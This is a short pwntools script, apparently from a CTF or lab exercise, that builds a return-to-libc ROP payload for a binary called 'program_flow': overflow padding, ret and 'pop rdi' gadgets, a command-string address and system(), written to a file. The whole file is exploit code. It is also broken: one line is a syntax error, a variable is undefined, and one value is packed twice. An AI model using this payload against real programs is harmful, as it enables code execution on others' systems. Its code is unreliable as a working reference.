from pwn import *
import sys

p# = process(['./program_flow','payload'])

#p = readline() # secret

#secret = int(p.readline().strip().decode(), 16)
#system = int(p.readline().strip().decode(), 16)

#system = int(p.readline().strip().decode().split(' ')[-1], 16) # secret
#buffer = int(p.readline().strip().decode().split(' ')[-1], 16)
# p.readline() # buffer

#print(hex(system))



u = 0
x = 8

secret=p64(0x4011c2)
system=p64(0x401060)

# ropper -f return_to_libc --search 'pop rdi'
addr_ret = p64(0x401016)
addr_pop_rdi = p64(0x40137b)
addr_system = p64(system)
addr_command = p64(0x7ffff7f56ea4)

payload1 = b'a'*X + b'p'* u+b'r' * 8
payload2 = addr_ret + addr_pop_rdi + addr_command + addr_system

with open('return_pay.bin','wb') as f:
    f.write(payload1)
    f.write(payload2)

